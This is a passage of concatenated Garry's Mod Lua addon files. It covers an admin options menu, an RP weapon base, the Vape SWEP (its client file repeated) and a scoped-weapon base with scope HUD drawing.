					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_enabled. Note: This will take effect on map change. It may still be spawned through the give weapon command.' )
					pnl:CheckBox( 'Admin Spawnable only', 'sk_mas_ninjaskunai_adminonly' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_adminonly. Note: Map change, or you must die / drop / strip it & spawn it again in order for this to take effect' )
					pnl:CheckBox( 'Cheat: Infinite Ultimate Charge' , 'sk_mas_ninjaskunai_infinitecharge' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_infinitecharge. Note: Change is immediate.' )
					pnl:CheckBox( 'Cheat: No Cooldowns', 'sk_mas_ninjaskunai_nocooldown' )
					pnl:ControlHelp( 'Console variant: sk_mas_ninjaskunai_infinitecharge. Note: You must die/ drop / strip it & spawn it again in order for this to take effect.' )
					pnl:ControlHelp( '' )
					
					pnl:Help( 'How awesome is this slider?' )
					pnl:NumSlider( 'Awesomeness', '', 1, 10, 0 )
					pnl:NumSlider( 'Slidiness', '', 1, 100, 0 )
					pnl:ControlHelp( '' )
					pnl:ControlHelp( '' )
				end // end If Admin
				
				if LocalPlayer():IsSuperAdmin() then
					pnl:Help( 'Super-Admin Options' )
					pnl:ControlHelp( "Note, each of these options can have a huge impact on player perspectives. It is recommended to leave the options below enabled." )
					pnl:CheckBox( 'Record Max Health on Spawn', 'sk_mas_setmaxhealth_onspawn' )
					pnl:ControlHelp( "Console variant: sk_mas_setmaxhealth_onspawn. Note: Map change only. Leave this active unless it is actually conflicting with another addon. Disabling this results in healing abilities only going to 100 HP (the default max health) unless defined by another addon. DarkRP DOES NOT set MAX HEALTH by default, hence why I made this code!" ) 
					pnl:CheckBox( 'NPC Lag Compensation', 'sk_mas_lagcompensate_npc' )
					pnl:ControlHelp( "Console variant: sk_mas_lagcompensate_npc. Note: Map change only. Keep this on even if NPC's aren't currently in use. Leave this active unless it is confirmed to be conflicting with another addon or if you are maxing your CPU and RAM and need every scrap. Removing this greatly affects player perspectives and should be re-enabled ASAP." )
					pnl:ControlHelp( '' )
					pnl:ControlHelp( '' )
					
				end // end If SuperAdmin
				
			end ) // end F'n
			
		print("MAS: Populated Tool Menu")
	end ) // end Hook Tool Menu


end // end If Client
--PATH addons/__main_only_1st/lua/weapons/weapon_rp_base.lua:
AddCSLuaFile()
SWEP.Base = "mhs_weapon_base"
if SERVER then
	SWEP.AutoSwitchTo = false
	SWEP.AutoSwitchFrom = false
else
	SWEP.PrintName = "RP Weapon Base"
	SWEP.DrawAmmo = false
	SWEP.DrawCrosshair = false
	SWEP.ViewModelFOV = 68
	SWEP.Category = "RP"
	SWEP.Author = ""
end

SWEP.HoldType = "normal"
SWEP.ViewModel = ""
SWEP.WorldModel = ""
SWEP.AdminOnly = true
SWEP.UseHands = true
SWEP.Primary = {
	ClipSize = -1,
	DefaultClip = -1,
	Automatic = true,
	Ammo = "none",
	Delay = 0.5,
	Sound = Sound( "ambient/voices/cough1.wav" )
}

SWEP.Secondary = {
	ClipSize = -1,
	DefaultClip = -1,
	Automatic = true,
	Ammo = "none",
	Delay = 0.5,
	Sound = Sound( "ambient/voices/cough2.wav" )
}

SWEP._Reload = {
	Delay = 2,
	Sound = Sound( "npc/combine_soldier/vo/administer.wav" )
}

SWEP.HitDistance = 100
function SWEP:SetupDataTables()
	self:NetworkVar( "Float", 0, "NextReload" )
end

function SWEP:Initialize()
	self:SetHoldType( self.HoldType )
end

function SWEP:PrimaryAttack()
	self:SetNextPrimaryFire( CurTime() + self.Primary.Delay )
end

function SWEP:SecondaryAttack()
	self:SetNextSecondaryFire( CurTime() + self.Secondary.Delay )
end

function SWEP:Reload()
	self:SetNextReload( CurTime() + self._Reload.Delay )
end

function SWEP:CanReload()
	return CurTime() > self:GetNextReload()
end

function SWEP:Holster()
	return true
end
--PATH addons/__main/lua/weapons/weapon_vape/cl_init.lua:
-- weapon_vape/cl_init.lua
-- Defines common clientside code/defaults for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

include('shared.lua')

function SWEP:DrawWorldModel()
	local ply = self:GetOwner()

	local vapeScale = self.VapeScale or 1
	self:SetModelScale(vapeScale, 0) 
	self:SetSubMaterial()

	if IsValid(ply) then
		local modelStr = ply:GetModel():sub(1,17)
		local isPony = modelStr=="models/ppm/player" or modelStr=="models/mlp/player" or modelStr=="models/cppm/playe"

		local bn = isPony and "LrigScull" or "ValveBiped.Bip01_R_Hand"
		if ply.vapeArmFullyUp then bn ="ValveBiped.Bip01_Head1" end
		local bon = ply:LookupBone(bn) or 0

		local opos = self:GetPos()
		local oang = self:GetAngles()
		local bp,ba = ply:GetBonePosition(bon)
		if bp then opos = bp end
		if ba then oang = ba end

		if isPony then
			--pony position
			opos = opos + (oang:Forward()*19.4) + (oang:Right()*-4.36) + (oang:Up()*-2.5)
			oang:RotateAroundAxis(oang:Right(),80)
			oang:RotateAroundAxis(oang:Forward(),12)
			oang:RotateAroundAxis(oang:Up(),20)
			opos = opos + (oang:Up()*(2.3+((vapeScale-1)*-10.25)))
		else
			if ply.vapeArmFullyUp then
				--head position
				opos = opos + (oang:Forward()*0.74) + (oang:Right()*15) + (oang:Up()*2)
				oang:RotateAroundAxis(oang:Forward(),-100)
				oang:RotateAroundAxis(oang:Up(),100)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
			else
				--hand position
				oang:RotateAroundAxis(oang:Forward(),90)
				oang:RotateAroundAxis(oang:Right(),90)
				opos = opos + (oang:Forward()*2) + (oang:Up()*-4.5) + (oang:Right()*-2)
				oang:RotateAroundAxis(oang:Forward(),69)
				oang:RotateAroundAxis(oang:Up(),10)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
				if self:GetClass()=="weapon_vape_butterfly" then
					opos = opos + (oang:Up()*6)
					oang:RotateAroundAxis(oang:Right(),Lerp(ply.vapeArmUpAmt or 0,0,-360))
					opos = opos + (oang:Up()*-6)
				end
			end
		end
		self:SetupBones()

		local mrt = self:GetBoneMatrix(0)
		if mrt then
		mrt:SetTranslation(opos)
		mrt:SetAngles(oang)

		self:SetBoneMatrix(0, mrt)
		end
	end

	self:DrawModel()
end

function SWEP:GetViewModelPosition(pos, ang)
	--mouth pos
	local vmpos1=self.VapeVMPos1 or Vector(18.5,-3.4,-3)
	local vmang1=self.VapeVMAng1 or Vector(170,-105,82)
	--hand pos
	local vmpos2=self.VapeVMPos2 or Vector(24,-8,-11.2)
	local vmang2=self.VapeVMAng2 or Vector(170,-108,132)

	if not LocalPlayer().vapeArmTime then LocalPlayer().vapeArmTime=0 end
	local lerp = math.Clamp((os.clock()-LocalPlayer().vapeArmTime)*3,0,1)
	if LocalPlayer().vapeArm then lerp = 1-lerp end
	local newpos = LerpVector(lerp,vmpos1,vmpos2)
	local newang = LerpVector(lerp,vmang1,vmang2)
	--I have a good reason for doing it like this
	newang = Angle(newang.x,newang.y,newang.z) 
	
	pos,ang = LocalToWorld(newpos,newang,pos,ang)
	return pos, ang
end
--PATH addons/__main/lua/weapons/weapon_vape/cl_init.lua:
-- weapon_vape/cl_init.lua
-- Defines common clientside code/defaults for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

include('shared.lua')

function SWEP:DrawWorldModel()
	local ply = self:GetOwner()

	local vapeScale = self.VapeScale or 1
	self:SetModelScale(vapeScale, 0) 
	self:SetSubMaterial()

	if IsValid(ply) then
		local modelStr = ply:GetModel():sub(1,17)
		local isPony = modelStr=="models/ppm/player" or modelStr=="models/mlp/player" or modelStr=="models/cppm/playe"

		local bn = isPony and "LrigScull" or "ValveBiped.Bip01_R_Hand"
		if ply.vapeArmFullyUp then bn ="ValveBiped.Bip01_Head1" end
		local bon = ply:LookupBone(bn) or 0

		local opos = self:GetPos()
		local oang = self:GetAngles()
		local bp,ba = ply:GetBonePosition(bon)
		if bp then opos = bp end
		if ba then oang = ba end

		if isPony then
			--pony position
			opos = opos + (oang:Forward()*19.4) + (oang:Right()*-4.36) + (oang:Up()*-2.5)
			oang:RotateAroundAxis(oang:Right(),80)
			oang:RotateAroundAxis(oang:Forward(),12)
			oang:RotateAroundAxis(oang:Up(),20)
			opos = opos + (oang:Up()*(2.3+((vapeScale-1)*-10.25)))
		else
			if ply.vapeArmFullyUp then
				--head position
				opos = opos + (oang:Forward()*0.74) + (oang:Right()*15) + (oang:Up()*2)
				oang:RotateAroundAxis(oang:Forward(),-100)
				oang:RotateAroundAxis(oang:Up(),100)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
			else
				--hand position
				oang:RotateAroundAxis(oang:Forward(),90)
				oang:RotateAroundAxis(oang:Right(),90)
				opos = opos + (oang:Forward()*2) + (oang:Up()*-4.5) + (oang:Right()*-2)
				oang:RotateAroundAxis(oang:Forward(),69)
				oang:RotateAroundAxis(oang:Up(),10)
				opos = opos + (oang:Up()*(vapeScale-1)*-10.25)
				if self:GetClass()=="weapon_vape_butterfly" then
					opos = opos + (oang:Up()*6)
					oang:RotateAroundAxis(oang:Right(),Lerp(ply.vapeArmUpAmt or 0,0,-360))
					opos = opos + (oang:Up()*-6)
				end
			end
		end
		self:SetupBones()

		local mrt = self:GetBoneMatrix(0)
		if mrt then
		mrt:SetTranslation(opos)
		mrt:SetAngles(oang)

		self:SetBoneMatrix(0, mrt)
		end
	end

	self:DrawModel()
end

function SWEP:GetViewModelPosition(pos, ang)
	--mouth pos
	local vmpos1=self.VapeVMPos1 or Vector(18.5,-3.4,-3)
	local vmang1=self.VapeVMAng1 or Vector(170,-105,82)
	--hand pos
	local vmpos2=self.VapeVMPos2 or Vector(24,-8,-11.2)
	local vmang2=self.VapeVMAng2 or Vector(170,-108,132)

	if not LocalPlayer().vapeArmTime then LocalPlayer().vapeArmTime=0 end
	local lerp = math.Clamp((os.clock()-LocalPlayer().vapeArmTime)*3,0,1)
	if LocalPlayer().vapeArm then lerp = 1-lerp end
	local newpos = LerpVector(lerp,vmpos1,vmpos2)
	local newang = LerpVector(lerp,vmang1,vmang2)
	--I have a good reason for doing it like this
	newang = Angle(newang.x,newang.y,newang.z) 
	
	pos,ang = LocalToWorld(newpos,newang,pos,ang)
	return pos, ang
end
--PATH addons/__main/lua/weapons/weapon_vape/shared.lua:
-- weapon_vape/shared.lua
-- Defines common shared code/defaults for Vape SWEP

-- Vape SWEP by Swamp Onions - http://steamcommunity.com/id/swamponions/

SWEP.Author = "Swamp Onions"

SWEP.Instructions = "LMB: Rip Fat Clouds\n (Hold and release)\nRMB & Reload: Play Sounds\n\nVape Nation!"

SWEP.PrintName = "Vape"

SWEP.IconLetter	= "V"
SWEP.Category = "Vapes"
SWEP.Slot = 1
SWEP.SlotPos = 0

SWEP.ViewModelFOV = 62 --default

SWEP.WepSelectIcon = surface and surface.GetTextureID("vape_icon")
SWEP.BounceWeaponIcon = false

SWEP.ViewModel = "models/swamponions/vape.mdl"
SWEP.WorldModel = "models/swamponions/vape.mdl"
SWEP.Spawnable = true
SWEP.AdminOnly = false

SWEP.Primary.Clipsize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = true
SWEP.Primary.Ammo = "none"

SWEP.Secondary.Clipsize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.DrawAmmo = false
SWEP.HoldType = "slam"

SWEP.VapeID = 1

function SWEP:Deploy()
	self:SetHoldType("slam")
end

function SWEP:PrimaryAttack()
	if SERVER then
		VapeUpdate(self.Owner, self.VapeID)
	end
	self.Weapon:SetNextPrimaryFire(CurTime() + 0.1)
end

function SWEP:SecondaryAttack()
	if GetConVar("vape_block_sounds"):GetBool() then return end
	
	local pitch = 100 + (self.SoundPitchMod or 0) + (self.Owner:Crouching() and 40 or 0)
	self:EmitSound("vapegogreen.wav", 80, pitch + math.Rand(-5,5))
	if SERVER then
		net.Start("VapeTalking")
		net.WriteEntity(self.Owner)
		net.WriteFloat(CurTime() + (0.6*100/pitch))
		net.Broadcast()
	end
end

function SWEP:Reload()
	if GetConVar("vape_block_sounds"):GetBool() then return end

	if self.reloading then return end
	self.reloading=true
	timer.Simple(0.5, function() self.reloading=false end)
	local pitch = 100 + (self.SoundPitchMod or 0) + (self.Owner:Crouching() and 40 or 0)
	self:EmitSound("vapenaysh.wav", 80, pitch + math.Rand(-5,5))
	if SERVER then
		net.Start("VapeTalking")
		net.WriteEntity(self.Owner)
		net.WriteFloat(CurTime() + (2.2*100/pitch))
		net.Broadcast()
	end
end

function SWEP:Holster()
	if SERVER and IsValid(self.Owner) then
		ReleaseVape(self.Owner)
	end
	return true
end

SWEP.OnDrop = SWEP.Holster
SWEP.OnRemove = SWEP.Holster
--PATH addons/__main/lua/weapons/zekeou_scoped_base/shared.lua:
-- Variables that are used on both client and server
SWEP.Category				= ""
SWEP.Author				= "Generic Default, Worshipper, Clavus, and Bob"
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.DrawCrosshair			= true	
SWEP.ViewModelFOV			= 65
SWEP.ViewModelFlip			= true

SWEP.Base 				= "zekeou_gun_base"

SWEP.Spawnable				= false
SWEP.AdminSpawnable			= false

SWEP.Primary.Sound 			= Sound("")				-- Sound of the gun
SWEP.Primary.Round 			= ("")					-- What kind of bullet?
SWEP.Primary.RPM				= 0					-- This is in Rounds Per Minute
SWEP.Primary.Cone			= 0.15					-- Accuracy of NPCs
SWEP.Primary.Recoil		= 10
SWEP.Primary.Damage		= 10
SWEP.Primary.Spread		= .01					--define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.NumShots	= 1
SWEP.Primary.ClipSize			= 0					-- Size of a clip
SWEP.Primary.DefaultClip			= 0					-- Default number of bullets in a clip
SWEP.Primary.KickUp			= 0					-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0					-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal			= 0					-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true					-- Automatic/Semi Auto
SWEP.Primary.Ammo			= "none"					-- What kind of ammo

SWEP.Secondary.ClipSize			= 0					-- Size of a clip
SWEP.Secondary.DefaultClip			= 0					-- Default number of bullets in a clip
SWEP.Secondary.Automatic			= false					-- Automatic/Semi Auto if
SWEP.Secondary.Ammo			= "none"
SWEP.Secondary.ScopeZoom			= 0
SWEP.Secondary.UseACOG			= false	
SWEP.Secondary.UseMilDot			= false		
SWEP.Secondary.UseSVD			= false	
SWEP.Secondary.UseParabolic		= false	
SWEP.Secondary.UseElcan			= false
SWEP.Secondary.UseGreenDuplex		= false	

SWEP.Scoped				= true

SWEP.BoltAction		= false	

SWEP.Penetration			= true
SWEP.Ricochet			= true	
SWEP.MaxRicochet			= 10

SWEP.Tracer				= 0	

SWEP.data 				= {}					-- The starting firemode
SWEP.data.ironsights			= 1
SWEP.ScopeScale 			= 0.5
SWEP.ReticleScale 			= 0.5
SWEP.IronSightsPos = Vector (2.4537, 1.0923, 0.2696)
SWEP.IronSightsAng = Vector (0.0186, -0.0547, 0)

function SWEP:Initialize()
	self.Weapon:SetNetworkedBool("Reloading", false)
	util.PrecacheSound(self.Primary.Sound)
	if CLIENT then
	
		-- We need to get these so we can scale everything to the player's current resolution.
		local iScreenWidth = surface.ScreenWidth()
		local iScreenHeight = surface.ScreenHeight()
		
		-- The following code is only slightly riped off from Night Eagle
		-- These tables are used to draw things like scopes and crosshairs to the HUD.
		-- so DONT GET RID OF IT!

		self.ScopeTable = {}
		self.ScopeTable.l = iScreenHeight*self.ScopeScale
		self.ScopeTable.x1 = 0.5*(iScreenWidth + self.ScopeTable.l)
		self.ScopeTable.y1 = 0.5*(iScreenHeight - self.ScopeTable.l)
		self.ScopeTable.x2 = self.ScopeTable.x1
		self.ScopeTable.y2 = 0.5*(iScreenHeight + self.ScopeTable.l)
		self.ScopeTable.x3 = 0.5*(iScreenWidth - self.ScopeTable.l)
		self.ScopeTable.y3 = self.ScopeTable.y2
		self.ScopeTable.x4 = self.ScopeTable.x3
		self.ScopeTable.y4 = self.ScopeTable.y1
		self.ScopeTable.l = (iScreenHeight + 1)*self.ScopeScale -- I don't know why this works, but it does.

		self.QuadTable = {}
		self.QuadTable.x1 = 0
		self.QuadTable.y1 = 0
		self.QuadTable.w1 = iScreenWidth
		self.QuadTable.h1 = 0.5*iScreenHeight - self.ScopeTable.l
		self.QuadTable.x2 = 0
		self.QuadTable.y2 = 0.5*iScreenHeight + self.ScopeTable.l
		self.QuadTable.w2 = self.QuadTable.w1
		self.QuadTable.h2 = self.QuadTable.h1
		self.QuadTable.x3 = 0
		self.QuadTable.y3 = 0
		self.QuadTable.w3 = 0.5*iScreenWidth - self.ScopeTable.l
		self.QuadTable.h3 = iScreenHeight
		self.QuadTable.x4 = 0.5*iScreenWidth + self.ScopeTable.l
		self.QuadTable.y4 = 0
		self.QuadTable.w4 = self.QuadTable.w3
		self.QuadTable.h4 = self.QuadTable.h3

		self.LensTable = {}
		self.LensTable.x = self.QuadTable.w3
		self.LensTable.y = self.QuadTable.h1
		self.LensTable.w = 2*self.ScopeTable.l
		self.LensTable.h = 2*self.ScopeTable.l

		self.ReticleTable = {}
		self.ReticleTable.wdivider = 3.125
		self.ReticleTable.hdivider = 1.7579/self.ReticleScale		-- Draws the texture at 512 when the resolution is 1600x900
		self.ReticleTable.x = (iScreenWidth*0.5)-((iScreenHeight/self.ReticleTable.hdivider)*0.5)
		self.ReticleTable.y = (iScreenHeight*0.5)-((iScreenHeight/self.ReticleTable.hdivider)*0.5)
		self.ReticleTable.w = iScreenHeight/self.ReticleTable.hdivider
		self.ReticleTable.h = iScreenHeight/self.ReticleTable.hdivider

		self.FilterTable = {}
		self.FilterTable.wdivider = 3.125
		self.FilterTable.hdivider = 1.7579/1.35	
		self.FilterTable.x = (iScreenWidth*0.5)-((iScreenHeight/self.FilterTable.hdivider)*0.5)
		self.FilterTable.y = (iScreenHeight*0.5)-((iScreenHeight/self.FilterTable.hdivider)*0.5)
		self.FilterTable.w = iScreenHeight/self.FilterTable.hdivider
		self.FilterTable.h = iScreenHeight/self.FilterTable.hdivider

		
	end
	if SERVER then
		self:SetNPCMinBurst(3)
		self:SetNPCMaxBurst(10)
		self:SetNPCFireRate(1)
		self:SetCurrentWeaponProficiency( WEAPON_PROFICIENCY_VERY_GOOD )
	end
	self:SetWeaponHoldType(self.HoldType)
	
	if CLIENT then
	
		-- // Create a new table for every weapon instance
		self.VElements = table.FullCopy( self.VElements )
		self.WElements = table.FullCopy( self.WElements )
		self.ViewModelBoneMods = table.FullCopy( self.ViewModelBoneMods )

		self:CreateModels(self.VElements) -- create viewmodels
		self:CreateModels(self.WElements) -- create worldmodels
		
		-- // init view model bone build function
		if IsValid(self.Owner) and self.Owner:IsPlayer() then
		if self.Owner:Alive() then
			local vm = self.Owner:GetViewModel()
			if IsValid(vm) then
				self:ResetBonePositions(vm)
				-- // Init viewmodel visibility
				if (self.ShowViewModel == nil or self.ShowViewModel) then
					vm:SetColor(Color(255,255,255,255))
				else
					-- // however for some reason the view model resets to render mode 0 every frame so we just apply a debug material to prevent it from drawing
					vm:SetMaterial("Debug/hsv")			
				end
			end
			
		end
		end
		
	end
	
	if CLIENT then
		local oldpath = "vgui/hud/name" -- the path goes here
		local newpath = string.gsub(oldpath, "name", self.Gun)
		self.WepSelectIcon = surface.GetTextureID(newpath)
	end

end

function SWEP:BoltBack()
	if self.Weapon:Clip1() > 0 or self.Owner:GetAmmoCount( self.Weapon:GetPrimaryAmmoType() ) > 0 then
		timer.Simple(.25, function()
		if SERVER and self.Weapon != nil then 
			self.Weapon:SetNetworkedBool("Reloading", true)
			if self.Weapon:GetClass() == self.Gun then
				if(self:GetIronsights() == true) then
					self.Owner:SetFOV( 0, 0.3 )
					self:SetIronsights(false)
					self.Owner:DrawViewModel(true)
				end
				local boltactiontime = (self.Owner:GetViewModel():SequenceDuration())
				timer.Simple(boltactiontime + .1, 
					function() if SERVER and self.Weapon != nil then
						self.Weapon:SetNetworkedBool("Reloading", false)
						if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then 
							self.Owner:SetFOV( 75/self.Secondary.ScopeZoom, 0.15 )                      		
							self.IronSightsPos = self.SightsPos					-- Bring it up
							self.IronSightsAng = self.SightsAng					-- Bring it up
							self.DrawCrosshair = false
							self:SetIronsights(true, self.Owner)
							self.Owner:DrawViewModel(false)
						end
					end 
				end)
			end
		else return end end )
	end	
end

function SWEP:Reload()

	if self.Owner:KeyDown(IN_USE) then return end
	
	self.Weapon:DefaultReload(ACT_VM_RELOAD) 
	if !self.Owner:IsNPC() then
	self.Idle = CurTime() + self.Owner:GetViewModel():SequenceDuration() end

	if ( self.Weapon:Clip1() < self.Primary.ClipSize ) and !self.Owner:IsNPC() then
	-- When the current clip < full clip and the rest of your ammo > 0, then

		self.Owner:SetFOV( 0, 0.3 )
		-- Zoom = 0

		self:SetIronsights(false)
		-- Set the ironsight to false
		self.Weapon:SetNetworkedBool("Reloading", true)
		if CLIENT then return end
		self.Owner:DrawViewModel(true)
	end
	
	local waitdammit
	if self.Owner:GetViewModel() == nil then 
		waitdammit = 3
	else
		waitdammit = (self.Owner:GetViewModel():SequenceDuration())
	end
	timer.Simple(waitdammit + .1, function()
	if self.Weapon != nil then 
	self.Weapon:SetNetworkedBool("Reloading", false)
	if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then 
		if CLIENT then return end
		self.Owner:SetFOV( 75/self.Secondary.ScopeZoom, 0.15 )                      		
		self.IronSightsPos = self.SightsPos					-- Bring it up
		self.IronSightsAng = self.SightsAng					-- Bring it up
		self.DrawCrosshair = false
		self:SetIronsights(true, self.Owner)
		self.Owner:DrawViewModel(false)
 	elseif self.Owner:KeyDown(IN_SPEED) and self.Weapon:GetClass() == self.Gun then
		self.Weapon:SetNextPrimaryFire(CurTime()+0.3)				-- Make it so you can't shoot for another quarter second
		self.IronSightsPos = self.RunSightsPos					-- Hold it down
		self.IronSightsAng = self.RunSightsAng					-- Hold it down
		self:SetIronsights(true, self.Owner)					-- Set the ironsight true
		self.Owner:SetFOV( 0, 0.2 )
	else return end
	end end)
end

function SWEP:PostReloadScopeCheck()
	if self.Weapon != nil then 
	self.Weapon:SetNetworkedBool("Reloading", false)
	if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then 
		if CLIENT then return end
		self.Owner:SetFOV( 75/self.Secondary.ScopeZoom, 0.15 )                      		
		self.IronSightsPos = self.SightsPos					-- Bring it up
		self.IronSightsAng = self.SightsAng					-- Bring it up
		self.DrawCrosshair = false
		self:SetIronsights(true, self.Owner)
		self.Owner:DrawViewModel(false)
 	elseif self.Owner:KeyDown(IN_SPEED) and self.Weapon:GetClass() == self.Gun then
		self.Weapon:SetNextPrimaryFire(CurTime()+0.3)				-- Make it so you can't shoot for another quarter second
		self.IronSightsPos = self.RunSightsPos					-- Hold it down
		self.IronSightsAng = self.RunSightsAng					-- Hold it down
		self:SetIronsights(true, self.Owner)					-- Set the ironsight true
		self.Owner:SetFOV( 0, 0.2 )
	else return end
	end
end


/*---------------------------------------------------------
IronSight
---------------------------------------------------------*/
function SWEP:IronSight()
	
	if self.SelectiveFire and self.NextFireSelect < CurTime() and not (self.Weapon:GetNWBool("Reloading")) then
		if self.Owner:KeyDown(IN_USE) and self.Owner:KeyPressed(IN_RELOAD) then
			self:SelectFireMode()
		end
	end
	
	if self.Owner:KeyDown(IN_USE) and self.Owner:KeyPressed(IN_ATTACK2) then return end
	
	if self.Owner:KeyPressed(IN_SPEED) and not (self.Weapon:GetNWBool("Reloading")) then		-- If you hold E and you can shoot then
	self.Weapon:SetNextPrimaryFire(CurTime()+0.3)				-- Make it so you can't shoot for another quarter second
	self.IronSightsPos = self.RunSightsPos					-- Hold it down
	self.IronSightsAng = self.RunSightsAng					-- Hold it down
	self:SetIronsights(true, self.Owner)					-- Set the ironsight true
	self.Owner:SetFOV( 0, 0.2 )
	end	
							
	if self.Owner:KeyDown(IN_SPEED) and not (self.Weapon:GetNWBool("Reloading")) then		-- If you hold E or run then
	self.Weapon:SetNextPrimaryFire(CurTime()+0.3)				-- Make it so you can't shoot for another quarter second
	end								-- Lower the gun

	if self.Owner:KeyReleased(IN_USE) || self.Owner:KeyReleased (IN_SPEED) then	-- If you release E then
	self:SetIronsights(false, self.Owner)					-- Set the ironsight true
	self.DrawCrosshair = self.XHair
	end


	if self.Owner:KeyPressed(IN_SPEED) || self.Owner:KeyPressed(IN_USE) then	-- If you run then
		self.Owner:SetFOV( 0, 0.2 )
		self.DrawCrosshair = false
		if CLIENT then return end
		self.Owner:DrawViewModel(true)
	end	

		if self.Owner:KeyPressed(IN_ATTACK2) and !self.Owner:KeyDown(IN_SPEED) and not (self.Weapon:GetNWBool("Reloading")) then
			self.Owner:SetFOV( 75/self.Secondary.ScopeZoom, 0.15 )                      		
			self.IronSightsPos = self.SightsPos					-- Bring it up
			self.IronSightsAng = self.SightsAng					-- Bring it up
			self.DrawCrosshair = false
			self:SetIronsights(true, self.Owner)
			if CLIENT then return end
			self.Owner:DrawViewModel(false)
		elseif self.Owner:KeyPressed(IN_ATTACK2) and not (self.Weapon:GetNWBool("Reloading")) and self.Owner:KeyDown(IN_SPEED) then
			self.Weapon:SetNextPrimaryFire(CurTime()+0.3)				-- Make it so you can't shoot for another quarter second
			self.IronSightsPos = self.RunSightsPos					-- Hold it down
			self.IronSightsAng = self.RunSightsAng					-- Hold it down
			self:SetIronsights(true, self.Owner)					-- Set the ironsight true
			self.Owner:SetFOV( 0, 0.2 )
		end

	if (self.Owner:KeyReleased(IN_ATTACK2) || self.Owner:KeyDown(IN_SPEED)) and !self.Owner:KeyDown(IN_USE) and !self.Owner:KeyDown(IN_SPEED) then
		self.Owner:SetFOV( 0, 0.2 )
		self:SetIronsights(false, self.Owner)
		self.DrawCrosshair = self.XHair
		-- Set the ironsight false
		if CLIENT then return end
		self.Owner:DrawViewModel(true)
		end

		if self.Owner:KeyDown(IN_ATTACK2) and !self.Owner:KeyDown(IN_USE) and !self.Owner:KeyDown(IN_SPEED) then
		self.SwayScale 	= 0.05
		self.BobScale 	= 0.05
		else
		self.SwayScale 	= 1.0
		self.BobScale 	= 1.0
		end
end

function SWEP:DrawHUD()


	if  self.Owner:KeyDown(IN_ATTACK2) and (self:GetIronsights() == true) and (!self.Owner:KeyDown(IN_SPEED) and !self.Owner:KeyDown(IN_USE)) then

			if self.Secondary.UseACOG then
			-- Draw the FAKE SCOPE THANG
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_closedsight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)

			-- Draw the CHEVRON
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_acogchevron"))
			surface.DrawTexturedRect(self.ReticleTable.x, self.ReticleTable.y, self.ReticleTable.w, self.ReticleTable.h)

			-- Draw the ACOG REFERENCE LINES
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_acogcross"))
			surface.DrawTexturedRect(self.ReticleTable.x, self.ReticleTable.y, self.ReticleTable.w, self.ReticleTable.h)
			end

			if self.Secondary.UseMilDot then
			-- Draw the MIL DOT SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_scopesight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)
			end

			if self.Secondary.UseSVD then
			-- Draw the SVD SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_svdsight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)
			end

			if self.Secondary.UseParabolic then
			-- Draw the PARABOLIC SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_parabolicsight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)
			end

			if self.Secondary.UseElcan then
			-- Draw the RETICLE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_elcanreticle"))
			surface.DrawTexturedRect(self.ReticleTable.x, self.ReticleTable.y, self.ReticleTable.w, self.ReticleTable.h)
			
			-- Draw the ELCAN SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_elcansight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)
			end

			if self.Secondary.UseGreenDuplex then
			-- Draw the RETICLE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_nvgilluminatedduplex"))
			surface.DrawTexturedRect(self.ReticleTable.x, self.ReticleTable.y, self.ReticleTable.w, self.ReticleTable.h)

			-- Draw the SCOPE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/gdcw_closedsight"))
			surface.DrawTexturedRect(self.LensTable.x, self.LensTable.y, self.LensTable.w, self.LensTable.h)
			end
			
			if self.Secondary.UseAimpoint then
			-- Draw the RETICLE
			surface.SetDrawColor(0, 0, 0, 255)
			surface.SetTexture(surface.GetTextureID("scope/aimpoint"))
